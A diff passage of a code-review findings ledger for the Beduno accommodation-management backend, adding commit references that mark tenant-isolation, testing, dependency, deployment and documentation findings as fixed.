 - **Suggested fix:** After mapping, `if (stay.getStatus() == EXPECTED_TODAY && !request.dateFrom().equals(today)) stay.setStatus(PLANNED);` (and, with DOM-04 fixed, promote PLANNED to EXPECTED_TODAY when `dateFrom <= today`). Test: `shouldRevertToPlanned_whenExpectedTodayStayIsPostponed`.
 - **Confidence:** HIGH
+- **Status:** fixed in 0f56dcc
 
 #### DOM-18 — New unsanctioned cross-tenant read in `ExportService`, and the sanctioned `loadWorkers` exception is now unnecessary
 - **Severity:** LOW
@@ -530,6 +590,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** None today; a future caller passing ids from a non-filtered source silently reads other agencies' bed labels/worker names.
 - **Suggested fix:** Add `List<Bed> findAllByAgencyIdAndIdIn(UUID agencyId, Collection<UUID> ids)` to `BedRepository` and use it in `ExportService`; switch `OccupancyService.loadWorkers` to `findAllByAgencyIdAndIdIn(agencyId, workerIds)` and delete the exception from `CLAUDE.md`/`AGENTS.md`/`docs/architecture.md`.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### DOM-19 — Dead code, stale "phase 4" comments, duplicated helpers, MapStruct unmapped-target policy left at WARN
 - **Severity:** LOW
@@ -545,6 +606,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** Maintenance risk only.
 - **Suggested fix:** Delete the two room-count queries, the `toSummary` methods and records, and `toStringMap`; rewrite the three comments to state the invariant ("bed is non-null on every path; null is tolerated only for unit tests"); extract `currentUserId()` into `CurrentUser.current()` or a small `SecurityUtils`; add `options.compilerArgs.add("-Amapstruct.unmappedTargetPolicy=ERROR")`.
 - **Confidence:** HIGH
+- **Status:** fixed in 7b83349, a2edf04 and 0047213 — dead queries, summary mappers, toStringMap and the stale comments removed; currentUserId consolidated into SecurityUtils; MapStruct unmappedTargetPolicy set to ERROR.
 
 #### DOM-20 — Small validation gaps: `internalId` length, empty-string override, `PUT status=DELETED`
 - **Severity:** LOW
@@ -557,6 +619,7 @@ Read fully: every file under `auth/`, `common/security/`, `common/exception/`, `
 - **Failure scenario:** A CSV-style id pasted with trailing text → 500; an integration sending `overrideReason: ""` bypasses the gender warning with an empty audit reason.
 - **Suggested fix:** `@Size(max = 100)` on `internalId`; use `overrideReason == null || overrideReason.isBlank()`; either drop `DELETED` from the update path (`@Pattern`/custom validator) or route it through `delete()`.
 - **Confidence:** HIGH
+- **Status:** fixed in ae7dfb3
 
 **Also noted (not filed):**
 - `WorkerResponse` (phone, email, date of birth, notes) is returned in full to `FRONT_DESK` on `GET /workers` — a PII-minimisation question for the product owner rather than a defect.
@@ -604,6 +667,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A new `V15` with a data backfill ships (the team's own recorded incident class, test-plan risk #6), `publish.sh` rolls it out, the backfill mis-sets rows. `rollback_parameter` reverts the *image* only; the schema/data change is permanent, and the newest snapshot is whenever the instance was last stopped — possibly days old.
 - **Suggested fix:** In `publish.sh`, call `"$here/backup.sh" snapshot` (incremental, seconds) immediately before `send-command`, and abort if it fails. Add `deploy/backup.sh enable-daily` to the README "First launch" steps and make `launch.sh` warn when no DLM policy tagged `Project=beduno` exists.
 - **Confidence:** HIGH
+- **Status:** fixed in 7ea590b
 
 #### INF-02 — Login and refresh success paths have zero HTTP test coverage
 - **Severity:** HIGH
@@ -615,6 +679,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A regression in `AuthService.login` (wrong status filter, INACTIVE users allowed, `lastLoginAt` write breaking the transaction, a claim dropped from the access token) ships green; the first person to notice is the operator locked out of production after `publish.sh`.
 - **Suggested fix:** Add `shouldReturnTokens_whenCredentialsAreValid` (insert a user via `UserService`/JDBC with a real `passwordEncoder.encode`, POST login, assert 200, non-blank tokens, `user.role`, and that `jwtTokenProvider.getAgencyId(accessToken)` matches), `shouldRejectLogin_whenUserIsInactive`, and `shouldReturnNewPair_whenRefreshTokenIsValid`.
 - **Confidence:** HIGH
+- **Status:** fixed in f0d3489
 
 #### INF-03 — Spring Boot pinned to 3.4.4 (March 2025) with no dependency vulnerability scanning
 - **Severity:** HIGH
@@ -629,6 +694,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** An authenticated AGENCY_ADMIN (or anyone, for CVEs in request parsing that precede the security filter) sends a crafted request to the single production instance; the JVM is SIGKILLed against its 1024 MB cgroup and the service is down until the systemd restart loop recovers it.
 - **Suggested fix:** Bump to the latest 3.4.x patch (or 3.5.x), run `./gradlew dependencies --configuration runtimeClasspath` to confirm Tomcat/Security versions, and add either the OWASP `dependency-check-gradle` plugin to `./gradlew build` or a `.github/dependabot.yml` for `gradle`.
 - **Confidence:** MEDIUM — the pin, its age, and the multipart endpoint are verified from the repo; the exact resolved Tomcat version and CVE applicability could not be checked offline.
+- **Status:** fixed in 0209796 — Spring Boot 3.5.16 rather than a 3.4.x patch, since 3.4 is out of support. Resolved Tomcat 10.1.55, Spring Security 6.5.11. Dependabot rather than a build-time scanner; see .github/dependabot.yml for why.
 
 #### INF-04 — Undocumented cross-tenant queries violate the recorded multi-tenancy rule
 - **Severity:** MEDIUM
@@ -647,6 +713,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A future refactor feeds `bedLabelById` ids from a request body instead of from agency-filtered stays; labels from another agency's beds appear in a CSV export, and nothing in the docs flags the call site as needing review.
 - **Suggested fix:** Add `BedRepository.findAllByAgencyIdAndIdIn` and use it in `ExportService` (and replace `OccupancyService.loadWorkers`'s `findAllById` with the existing `findAllByAgencyIdAndIdIn`, removing that exception). Record the remaining uniqueness-check queries in CLAUDE.md and AGENTS.md with the justification that they key on globally unique ids/emails.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### INF-05 — Database-level failures (optimistic lock, unique race, column overflow) surface as 500
 - **Severity:** MEDIUM
@@ -665,6 +732,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** Two front-desk users check in / move the same stay within the same second; the loser gets `INTERNAL_ERROR` and a stack trace in the log instead of a `CONFLICT` it can retry. A worker CSV row with a 101-character internal id: the row is caught by the per-row `catch (Exception e)` as `row_failed`, but the same value via `POST /workers` is a 500.
 - **Suggested fix:** Add `@ExceptionHandler(ObjectOptimisticLockingFailureException.class)` -> 409 `error.concurrent_modification` and `@ExceptionHandler(DataIntegrityViolationException.class)` -> 409 `error.conflict` (define both codes in all six bundles). Add `@Size(max = 100)` to `internalId` and a `StayGuardIntegrationTest`-style test for it.
 - **Confidence:** HIGH
+- **Status:** fixed in ae7dfb3
 
 #### INF-06 — "Today" is computed in the JVM default zone, and nothing pins the container to the business zone
 - **Severity:** MEDIUM
@@ -683,6 +751,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** At 00:30 Warsaw time on 1 May, `GET /properties/{id}/rooms` (which uses `LocalDate.now()` for occupancy) still reports 30 April's occupants, and a stay with `dateFrom = 1 May` is not yet `EXPECTED_TODAY`; a night porter checking someone in at 00:30 gets a 409.
 - **Suggested fix:** Introduce a `beduno.time-zone` property (default `Europe/Warsaw`), a `Clock` bean, and use `LocalDate.now(clock)` everywhere; set `zone = "${beduno.time-zone}"` on `@Scheduled`. Alternatively set `ENV TZ=Europe/Warsaw` in the Dockerfile as a stopgap and document it in README.
 - **Confidence:** HIGH
+- **Status:** fixed in 0f56dcc
 
 #### INF-07 — Two tenant-isolation list tests still assert nothing about exclusion (documented gap, Phase 2 marked complete)
 - **Severity:** MEDIUM
@@ -700,6 +769,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** `WorkerRepository.findAllByAgencyIdWithFilters` loses its `agency_id` predicate in a refactor; both tests still pass, and the cross-agency leak reaches production.
 - **Suggested fix:** Capture the ids created for `DEFAULT_AGENCY_ID` and assert `.extracting(WorkerResponse::id).doesNotContain(defaultAgencyWorker.id())` (same for properties), exactly as the guideline's sample shows.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b
 
 #### INF-08 — The nightly PLANNED -> EXPECTED_TODAY sweep has zero test coverage
 - **Severity:** MEDIUM
@@ -719,6 +789,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** `findPlannedArrivingOn` is changed to filter by `TenantContext` "for consistency"; the scheduler thread has no tenant, throws, and no stay is ever promoted — every check-in in production returns 409 the next morning, with all tests green.
 - **Suggested fix:** Add `StaySchedulerIntegrationTest`: seed PLANNED stays for two agencies with `dateFrom = today` plus one with tomorrow and one CANCELLED, call `stayService.transitionPlannedToExpectedToday(today)`, assert exactly the two are `EXPECTED_TODAY` across both agencies and the others untouched; assert the return value.
 - **Confidence:** HIGH
+- **Status:** fixed in 0f56dcc
 
 #### INF-09 — Audit trail content is never asserted anywhere
 - **Severity:** MEDIUM
@@ -736,6 +807,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** Q19 in `open-questions.md` (check-in snapshots the *new* room as "previous state") is exactly the class of bug this would catch; a similar regression in `snapshot()` or a dropped `auditService.log` call in a new write path (architecture.md warns "a new write path must remember to log for itself") ships silently.
 - **Suggested fix:** Add `AuditIntegrationTest`: perform a check-in as a persisted user, then `GET /audit?entityType=STAY&entityId=<id>` and assert one `CHECKED_IN` event whose `actorUserId` is that user and whose `previousState.status` is `EXPECTED_TODAY`; add a FRONT_DESK 403 case and an `actorUserId` filter case.
 - **Confidence:** HIGH
+- **Status:** fixed in a888bdf
 
 #### INF-10 — `arrivals/export`, `exceptions/export`, and the `GET /stays` date/status/property filters are untested
 - **Severity:** MEDIUM
@@ -748,6 +820,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** The `CAST(:dateFrom AS DATE) IS NULL OR ...` guard is edited and the null-date branch stops matching open-ended stays; the planner's stay list silently omits every open-ended stay in the requested window.
 - **Suggested fix:** Extend `ExportIntegrationTest` with one nested class per export (header assertion per language, FRONT_DESK 403 on occupancy/exceptions, 200 on arrivals); add `StayIntegrationTest.ListFilters` covering `status`, `propertyId`, an overlapping window, a non-overlapping window, and an open-ended stay.
 - **Confidence:** HIGH
+- **Status:** fixed in 088861b and a2edf04 — arrivals/exceptions exports and the five GET /stays filters, including the open-ended-stay window case.
 
 #### INF-11 — Deploy files on the box are frozen at first launch; no procedure or script updates them
 - **Severity:** MEDIUM
@@ -766,6 +839,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A reviewer merges a Caddyfile change adding `request_body max_size` or new CloudFront ranges; CI passes (`render-user-data.py` renders), `publish.sh` succeeds, and the box keeps serving the old Caddyfile indefinitely — the repo and production disagree with no signal.
 - **Suggested fix:** Add `deploy/sync.sh` that renders the same three heredocs and applies them via `aws ssm send-command` (then `systemctl restart beduno.service`), and have `publish.sh` refuse (or warn) when `git diff --quiet HEAD~N -- deploy/` shows those files changed since the last sync. Document it under "Day to day".
 - **Confidence:** HIGH
+- **Status:** fixed in 7ea590b
 
 #### INF-12 — `publish.sh` can publish a build that never passed tests or checkstyle
 - **Severity:** MEDIUM
@@ -783,6 +857,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** An operator commits on a feature branch, runs `deploy/publish.sh` to "try it in prod", and ships code that fails `MessageBundleTest` (missing i18n key) or a constraint-engine regression — the sha-tag makes it look deliberate and traceable, but nothing ran the 140+ tests.
 - **Suggested fix:** In `publish.sh`, before building: `git fetch origin && [ "$(git rev-parse HEAD)" = "$(git rev-parse origin/main)" ] || fail`, then `gh run list --commit "$(git rev-parse HEAD)" --status success --json conclusion` (or a local `./gradlew build`) as a gate; keep `ALLOW_DIRTY` but require an explicit `ALLOW_UNTESTED=1` too.
 - **Confidence:** HIGH
+- **Status:** fixed in 7ea590b
 
 #### INF-13 — README's rollback contract is already broken by V9/V13, and the doc does not say so
 - **Severity:** MEDIUM
@@ -803,6 +878,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A regression is found in the named-beds release; the operator follows the README rollback, points `APP_IMAGE` at the pre-named-beds sha, restarts, and `boot.sh` fails `--wait` — the systemd unit now crash-loops on every boot until someone re-points the parameter forward.
 - **Suggested fix:** Document in README that the rollback floor is `edcbb8d` (named-beds p4) and why. Adopt expand/contract for future schema changes: rename/drop only in the release *after* the code stops mapping a column. For V14-style tightening, a future `V15+__...sql` should precede `SET NOT NULL` with an idempotent backfill (`UPDATE ... WHERE bed_id IS NULL`) so it is safe on populated data.
 - **Confidence:** HIGH
+- **Status:** fixed in 7ea590b
 
 #### INF-14 — `docs/api-specification.md` (the frontend contract) contradicts the code in many places
 - **Severity:** MEDIUM
@@ -818,6 +894,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** The frontend team, told to build from this document, sends `genderRule: "ANY"` (400) or `sort=last_name` (400), or never builds the user-management screens because the appendix says the API does not exist.
 - **Suggested fix:** Re-reconcile the file against `openapi.yaml` (already regenerated 2026-09-14): fix the enum blocks, delete the users/room-response/roomNumber rows from the appendix, replace the three stale caveats (binding errors, XFF, CORS) with the current behaviour, and change every `sort=` example to camelCase.
 - **Confidence:** HIGH
+- **Status:** fixed in 084bec0
 
 #### INF-15 — README still describes the capacity model and understates property scoping; Users and Beds are missing from the API overview
 - **Severity:** MEDIUM
@@ -831,6 +908,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A new contributor (or agent) following README looks for `CapacityConstraint` to add a rule, or assumes beds are unscoped and skips the check when adding a bed endpoint.
 - **Suggested fix:** Replace the constraint bullets with `BedOccupancyConstraint` / `BED_BLOCKED` / `BED_UNAVAILABLE`, list beds among the scoped endpoints, and add Users and Beds tables to the API overview (roles per `UserController`/`BedController`).
 - **Confidence:** HIGH
+- **Status:** fixed in 084bec0
 
 #### INF-16 — `test-plan.md` status claims do not match the tests that exist
 - **Severity:** MEDIUM
@@ -850,6 +928,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** Someone reads "Phase 2 complete" as "risk #3 closed" and deprioritises roadmap slice S-08; the IDOR-class gap the plan ranks High impact stays open while the ledger says it is covered.
 - **Suggested fix:** Change Phase 2's status/goal to record that scoping is *documented, not enforced* for stays/occupancy (or split a Phase 2b "enforce"), mark Phase 4 as covered by the existing test with a link, and update §4/§5 to reference `ci.yml`.
 - **Confidence:** HIGH
+- **Status:** fixed in 0047213
 
 #### INF-17 — Architecture/testing/coding docs and deploy comments describe pre-V9/V13 and pre-Users code
 - **Severity:** MEDIUM
@@ -868,6 +947,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** The delete-guard rule (test-plan risk #4) is applied to the next entity by copying architecture.md's description, and a reviewer concludes bed deletion needs no guard — the opposite of the code and of `BedIntegrationTest.shouldRejectDelete_whenStayReferencesBed`.
 - **Suggested fix:** One reconciliation pass over the listed lines; mark Q9/Q16 fixed; delete the three "no user-management API" comments in `deploy/`; replace the testing-guidelines cleanup sentence with the real rule (unique ids per test, no cleanup).
 - **Confidence:** HIGH
+- **Status:** fixed in 084bec0
 
 #### INF-18 — Build and runtime images are not pinned; every boot pulls whatever the floating tags resolve to
 - **Severity:** LOW
@@ -885,6 +965,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** A Caddy 2.x release changes `trusted_proxies`/`client_ip` semantics; the next `instance.sh start` picks it up and the login throttle starts keying on the CloudFront edge, exactly the outage the Caddyfile comment describes.
 - **Suggested fix:** Pin `postgres:16.x-alpine`, `caddy:2.x.y-alpine` (or digests) in compose, pin the JDK/JRE images by digest, add `distributionSha256Sum` to the wrapper properties, and add `sha256sum -c` for the compose binary in `user-data.sh`.
 - **Confidence:** HIGH
+- **Status:** fixed in 7ea590b
 
 #### INF-19 — The suite starts four PostgreSQL containers and three Spring contexts per run
 - **Severity:** LOW
@@ -906,6 +987,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** CI wall-clock creeps past the 30-minute job timeout as the suite grows; the migration test class is the fourth container and the next `*RunnerIntegrationTest` will be the fifth.
 - **Suggested fix:** Introduce a `RunnerTestBase` shared by the two runner tests (one container, one `NONE` context, `TRUNCATE` per test); consider `testcontainers.reuse.enable=true` locally via `~/.testcontainers.properties` and document it.
 - **Confidence:** HIGH
+- **Status:** fixed in a2edf04
 
 #### INF-20 — Prod "JSON" log lines are not valid JSON on exceptions or special characters
 - **Severity:** LOW
@@ -919,6 +1001,7 @@ Read in full: every file under `src/main/java/com/beduno/stay/**` (including `co
 - **Failure scenario:** `GlobalExceptionHandler.handleGeneral` logs `Unhandled exception` with a 60-line stack trace; `docker logs` shows one JSON line followed by 60 non-JSON lines, and `instance.sh logs` output for the incident is mostly unparseable.
 - **Suggested fix:** Use `logstash-logback-encoder` (`LogstashEncoder`) with MDC fields included, or keep the console pattern and add `%nopex` plus a separate `%ex{short}` field with `%replace` for newlines.
 - **Confidence:** HIGH
+- **Status:** fixed in e1ca26c
 
 **Also noted (not filed):**
 - `BedunoApplicationSmokeTest.shouldRejectUnauthenticatedAccessToProtectedEndpoints` asserts `isIn(401, 403)` although the entry point deterministically returns 401 (`AuthIntegrationTest` already asserts 401).
